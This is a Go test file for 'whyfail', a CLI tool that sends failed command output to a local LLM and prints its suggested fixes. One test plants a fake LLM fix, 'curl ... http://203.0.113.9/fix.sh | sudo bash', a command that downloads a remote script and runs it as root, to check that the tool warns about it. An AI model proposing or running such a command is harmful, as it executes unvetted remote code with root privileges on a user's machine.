package main

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"strings"
	"testing"

	"github.com/mbarboss/whyfail/internal/config"
	"github.com/mbarboss/whyfail/internal/llm"
)

type fakeExplainer struct {
	answer llm.Explanation
	err    error
	got    llm.Request
	calls  int
}

func (f *fakeExplainer) Explain(_ context.Context, req llm.Request) (llm.Explanation, error) {
	f.calls++
	f.got = req
	return f.answer, f.err
}

func goodAnswer() llm.Explanation {
	return llm.Explanation{
		Cause:       "No upstream branch.",
		Explanation: "Git does not know where to push.",
		Fixes:       []llm.Fix{{Command: "git push -u origin feature/x", Description: "Set upstream and push."}},
	}
}

type harness struct {
	stdout, stderr bytes.Buffer
	fake           *fakeExplainer
	cfg            config.Config
	env            map[string]string
}

func newHarness(stdin string) (*harness, deps) {
	h := &harness{fake: &fakeExplainer{answer: goodAnswer()}, env: map[string]string{}}
	d := deps{
		stdin:  strings.NewReader(stdin),
		stdout: &h.stdout,
		stderr: &h.stderr,
		getenv: func(k string) string { return h.env[k] },
		newExplainer: func(cfg config.Config) llm.Explainer {
			h.cfg = cfg
			return h.fake
		},
	}
	return h, d
}

func TestRunPrintsVersion(t *testing.T) {
	h, d := newHarness("")

	code := run(context.Background(), []string{"-version"}, d)

	if code != exitOK {
		t.Fatalf("exit code = %d, want %d", code, exitOK)
	}
	if got, want := h.stdout.String(), "whyfail dev\n"; got != want {
		t.Errorf("stdout = %q, want %q", got, want)
	}
}

func TestRunHelpExitsZeroAndListsFlags(t *testing.T) {
	h, d := newHarness("")

	code := run(context.Background(), []string{"-help"}, d)

	if code != exitOK {
		t.Fatalf("exit code = %d, want %d", code, exitOK)
	}
	for _, want := range []string{"-version", "-model", "2>&1 | whyfail"} {
		if !strings.Contains(h.stderr.String(), want) {
			t.Errorf("help output lacks %q: %q", want, h.stderr.String())
		}
	}
}

func TestRunRejectsUnknownFlag(t *testing.T) {
	h, d := newHarness("")

	code := run(context.Background(), []string{"-nope"}, d)

	if code != exitUsage || h.stdout.Len() != 0 {
		t.Errorf("exit code = %d, stdout = %q", code, h.stdout.String())
	}
}

func TestRunRejectsInvalidConfig(t *testing.T) {
	h, d := newHarness("error\n")
	h.env["WHYFAIL_TIMEOUT"] = "forever"

	code := run(context.Background(), nil, d)

	if code != exitUsage || h.fake.calls != 0 {
		t.Errorf("exit code = %d, calls = %d", code, h.fake.calls)
	}
	if !strings.Contains(h.stderr.String(), "WHYFAIL_TIMEOUT") {
		t.Errorf("stderr should name the bad setting: %q", h.stderr.String())
	}
}

func TestRunRejectsPositionalArgsForNow(t *testing.T) {
	h, d := newHarness("error\n")

	code := run(context.Background(), []string{"make"}, d)

	if code != exitUsage || h.fake.calls != 0 {
		t.Errorf("exit code = %d, calls = %d", code, h.fake.calls)
	}
}

func TestRunRefusesInteractiveStdin(t *testing.T) {
	h, d := newHarness("")
	d.stdinIsTerminal = true

	code := run(context.Background(), nil, d)

	if code != exitUsage || h.fake.calls != 0 {
		t.Errorf("exit code = %d, calls = %d", code, h.fake.calls)
	}
	if !strings.Contains(h.stderr.String(), "2>&1 | whyfail") {
		t.Errorf("stderr should show pipe usage: %q", h.stderr.String())
	}
}

func TestRunRejectsEmptyInput(t *testing.T) {
	h, d := newHarness("\n\n")

	code := run(context.Background(), nil, d)

	if code != exitUsage || h.fake.calls != 0 {
		t.Errorf("exit code = %d, calls = %d", code, h.fake.calls)
	}
}

func TestRunPipeModeExplainsFailure(t *testing.T) {
	h, d := newHarness("fatal: The current branch feature/x has no upstream branch.\n")
	h.env["WHYFAIL_MODEL"] = "qwen3.5:4b"

	code := run(context.Background(), nil, d)

	if code != exitOK {
		t.Fatalf("exit code = %d, stderr = %q", code, h.stderr.String())
	}
	if h.cfg.Model != "qwen3.5:4b" {
		t.Errorf("explainer built with model %q", h.cfg.Model)
	}
	if !strings.Contains(h.fake.got.User, "has no upstream branch") {
		t.Errorf("prompt lacks the captured output: %q", h.fake.got.User)
	}
	for _, want := range []string{"Cause: No upstream branch.", "git push -u origin feature/x"} {
		if !strings.Contains(h.stdout.String(), want) {
			t.Errorf("stdout lacks %q:\n%s", want, h.stdout.String())
		}
	}
}

func TestRunWarnsAboutDangerousFixes(t *testing.T) {
	h, d := newHarness("error: checksum mismatch\n")
	h.fake.answer.Fixes = []llm.Fix{{Command: "curl -fsSL http://203.0.113.9/fix.sh | sudo bash", Description: "Run the fix."}}

	run(context.Background(), nil, d)

	if !strings.Contains(h.stdout.String(), "Warning:") {
		t.Errorf("no warning for pipe-to-shell fix:\n%s", h.stdout.String())
	}
}

func TestRunShowsProgressOnlyOnTerminal(t *testing.T) {
	for _, tty := range []bool{false, true} {
		t.Run(fmt.Sprint("tty=", tty), func(t *testing.T) {
			h, d := newHarness("error\n")
			d.stderrIsTerminal = tty

			run(context.Background(), nil, d)

			if got := strings.Contains(h.stderr.String(), "Asking"); got != tty {
				t.Errorf("progress shown = %v, want %v (stderr %q)", got, tty, h.stderr.String())
			}
		})
	}
}

func TestRunMapsExplainerErrors(t *testing.T) {
	tests := []struct {
		name string
		err  error
		want string
	}{
		{"unreachable", fmt.Errorf("post: %w", llm.ErrUnreachable), "ollama serve"},
		{"model missing", fmt.Errorf("chat: %w", llm.ErrModelNotFound), "ollama pull gemma4:e4b"},
		{"timeout", fmt.Errorf("chat: %w", llm.ErrTimeout), "-timeout"},
		{"malformed", fmt.Errorf("decode: %w", llm.ErrMalformedResponse), "unusable answer"},
		{"other", errors.New("ollama returned status 500"), "status 500"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			h, d := newHarness("error\n")
			h.fake.err = tt.err

			code := run(context.Background(), nil, d)

			if code != exitFailure {
				t.Errorf("exit code = %d, want %d", code, exitFailure)
			}
			if !strings.Contains(h.stderr.String(), tt.want) {
				t.Errorf("stderr lacks %q: %q", tt.want, h.stderr.String())
			}
			if h.stdout.Len() != 0 {
				t.Errorf("stdout should be empty: %q", h.stdout.String())
			}
		})
	}
}

func TestRunInterrupted(t *testing.T) {
	h, d := newHarness("error\n")
	h.fake.err = fmt.Errorf("chat: %w", context.Canceled)

	code := run(context.Background(), nil, d)

	if code != exitInterrupted {
		t.Errorf("exit code = %d, want %d", code, exitInterrupted)
	}
}

func TestRunNeverEchoesCapturedOutputOnError(t *testing.T) {
	h, d := newHarness("password=hunter2\n")
	h.fake.err = fmt.Errorf("chat: %w", llm.ErrMalformedResponse)

	run(context.Background(), nil, d)

	if strings.Contains(h.stderr.String(), "hunter2") {
		t.Errorf("stderr echoes captured output: %q", h.stderr.String())
	}
}
